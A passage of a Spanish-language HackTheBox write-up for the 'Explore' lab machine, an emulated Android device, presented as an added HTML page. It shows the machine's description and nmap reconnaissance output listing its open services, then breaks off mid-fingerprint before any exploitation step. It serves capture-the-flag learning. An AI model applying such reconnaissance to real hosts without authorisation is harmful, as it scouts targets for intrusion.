@@ -1,0 +1,873 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="icon" href="../../assets/favicon.svg">
+      <meta name="generator" content="mkdocs-1.2.2, mkdocs-material-7.2.0">
+    
+    
+      
+        <title>Explore - HackTheBox</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.fe914879.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ba0d045b.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
+      
+    
+    
+    
+    
+      
+
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="light-blue">
+  
+    
+    <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    
+      <script>var palette=__get("__palette");if(null!==palette&&"object"==typeof palette.color)for(var key in palette.color)document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#description" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="HackTheBox" class="md-header__button md-logo" aria-label="HackTheBox" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            HackTheBox
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Explore
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="light-blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7 10a2 2 0 0 1 2 2 2 2 0 0 1-2 2 2 2 0 0 1-2-2 2 2 0 0 1 2-2m10-3a5 5 0 0 1 5 5 5 5 0 0 1-5 5H7a5 5 0 0 1-5-5 5 5 0 0 1 5-5h10M7 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3h10a3 3 0 0 0 3-3 3 3 0 0 0-3-3H7z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        
+<a href="https://github.com/LoRKaa/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    https://github.com/LoRKaa
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      Home
+    </a>
+  </li>
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="./" class="md-tabs__link md-tabs__link--active">
+        Machines
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tools/htbenum/" class="md-tabs__link">
+        Tools
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="HackTheBox" class="md-nav__button md-logo" aria-label="HackTheBox" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg>
+
+    </a>
+    HackTheBox
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/LoRKaa/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    https://github.com/LoRKaa
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      <label class="md-nav__link" for="__nav_2">
+        Machines
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Machines" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Machines
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Explore
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Explore
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+     Description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+     Enumeration
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-own" class="md-nav__link">
+     User Own
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root-own" class="md-nav__link">
+     Root Own
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bountyhunter/" class="md-nav__link">
+        BountyHunter
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      <label class="md-nav__link" for="__nav_3">
+        Tools
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Tools" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Tools
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/htbenum/" class="md-nav__link">
+        HTBenum
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tools/ffuf/" class="md-nav__link">
+        FFUF
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+     Description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+     Enumeration
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user-own" class="md-nav__link">
+     User Own
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root-own" class="md-nav__link">
+     Root Own
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/LoRKaa/edit/master/docs/machines/explore.md" title="Edit this page" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                  <h1>Explore</h1>
+                
+                <style>
+  .md-typeset h1,
+  .md-content__button {
+    display: none;
+  }
+</style>
+
+<p><img alt="" src="../../assets/explore/profile.png" /></p>
+<p>Difficulty : <code>Easy</code><br />
+Operating System : <code>Android</code>  <br />
+Rating : <code>4.0</code><br />
+Author : <a href="https://app.hackthebox.eu/users/27897"><code>bertolis</code></a></p>
+<h3 id="description"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg></span> Description</h3>
+<p>Esta es una maquina diferente, emula un dispositivo android que expone un servicio vulnerable y un "tricky" para conectarnos a ella con la suite adb.
+Es una maquina divertida que nos acerca a un entorno que no solemos ver en la plataforma hack the box.</p>
+<h3 id="enumeration"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg></span> Enumeration</h3>
+<p>Para la enumeracion basica vamos a utilizar una tool que he desarrollado especificamente para trabajar con maquinas en la plataforma hackthebox.
+Esta herramienta crea la carpeta de trabajo, realiza un escaneo basico con nmap y si encuentra un servicio web le lanza una enumeracion basica.  </p>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4.97 11.03a.75.75 0 1 1 1.06-1.06L11 14.94V2.75a.75.75 0 0 1 1.5 0v12.19l4.97-4.97a.75.75 0 1 1 1.06 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0l-6.25-6.25zm-.22 9.47a.75.75 0 0 0 0 1.5h14.5a.75.75 0 0 0 0-1.5H4.75z"/></svg></span> Descarga: <a href="../../tools/htbenum"><strong>HTBenum</strong></a></p>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M14.53 15.59a8.25 8.25 0 1 1 1.06-1.06l5.69 5.69a.75.75 0 1 1-1.06 1.06l-5.69-5.69zM2.5 9.25a6.75 6.75 0 1 1 11.74 4.547.746.746 0 0 0-.443.442A6.75 6.75 0 0 1 2.5 9.25z"/></svg></span> Nmap
+<div class="highlight"><pre><span></span><code>Nmap scan report for explore.htb (10.10.10.247)
+Host is up (0.077s latency).
+
+PORT      STATE SERVICE VERSION
+2222/tcp  open  ssh     (protocol 2.0)
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey:
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+33083/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines:
+|     HTTP/1.0 400 Bad Request
+|     Date: Wed, 28 Jul 2021 20:20:01 GMT
+|     Content-Length: 22
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|   GetRequest:
+|     HTTP/1.1 412 Precondition Failed
+|     Date: Wed, 28 Jul 2021 20:20:01 GMT
+|     Content-Length: 0
+|   HTTPOptions:
+|     HTTP/1.0 501 Not Implemented
+|     Date: Wed, 28 Jul 2021 20:20:06 GMT
+|     Content-Length: 29
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Method not supported: OPTIONS
+|   Help:
+|     HTTP/1.0 400 Bad Request
+|     Date: Wed, 28 Jul 2021 20:20:22 GMT
+|     Content-Length: 26
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line: HELP
+|   Kerberos:
+|     HTTP/1.0 400 Bad Request
+|     Date: Wed, 28 Jul 2021 20:20:22 GMT
+|     Content-Length: 41
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|     qj?n0?k?
+|   RTSPRequest:
+|     HTTP/1.0 400 Bad Request
+|     Date: Wed, 28 Jul 2021 20:20:06 GMT
+|     Content-Length: 39
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     valid protocol version: RTSP/1.0
+|   SSLSessionReq:
+|     HTTP/1.0 400 Bad Request
+|     Date: Wed, 28 Jul 2021 20:20:22 GMT
+|     Content-Length: 73
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|     ?G???,???`~?
+|     ??{????w????&lt;=?o?
+|   TLSSessionReq:
+|     HTTP/1.0 400 Bad Request
+|     Date: Wed, 28 Jul 2021 20:20:22 GMT
+|     Content-Length: 71
+|     Content-Type: text/plain; charset=US-ASCII
+|     Connection: Close
+|     Invalid request line:
+|_    ??random1random2random3random4
+59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn&#39;t have a title (text/plain).
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port2222-TCP:V=7.70%I=7%D=7/28%Time=6101BA26%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,24,&quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port33083-TCP:V=7.70%I=7%D=7/28%Time=6101BA25%P=x86_64-pc-linux-gnu%r(G
+SF:enericLines,AA,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x20
+SF:28\x20Jul\x202021\x2020:20:01\x20GMT\r\nContent-Length:\x2022\r\nConten
+SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
+SF:r\nInvalid\x20request\x20line:\x20&quot;)%r(GetRequest,5C,&quot;HTTP/1\.1\x20412\
+SF:x20Precondition\x20Failed\r\nDate:\x20Wed,\x2028\x20Jul\x202021\x2020:2
+SF:0:01\x20GMT\r\nContent-Length:\x200\r\n\r\n&quot;)%r(HTTPOptions,B5,&quot;HTTP/1\
+SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Wed,\x2028\x20Jul\x202021\x
+SF:2020:20:06\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
+SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
+SF:0supported:\x20OPTIONS&quot;)%r(RTSPRequest,BB,&quot;HTTP/1\.0\x20400\x20Bad\x20R
+SF:equest\r\nDate:\x20Wed,\x2028\x20Jul\x202021\x2020:20:06\x20GMT\r\nCont
+SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
+SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
+SF:\x20\x20RTSP/1\.0&quot;)%r(Help,AE,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
+SF:te:\x20Wed,\x2028\x20Jul\x202021\x2020:20:22\x20GMT\r\nContent-Length:\
+SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
+SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&quot;)%r(SSLSessionReq
+SF:,DD,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x2028\x20Jul\x
+SF:202021\x2020:20:22\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
+SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
+SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
+SF:\0\?\?{\?\?\?\?w\?\?\?\?&lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&quot;)%r(TLSSession
+SF:Req,DB,&quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x2028\x20Ju
+SF:l\x202021\x2020:20:22\x20GMT\r\nContent-Length:\x2071\r\nContent-Type:\
+SF:x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInval
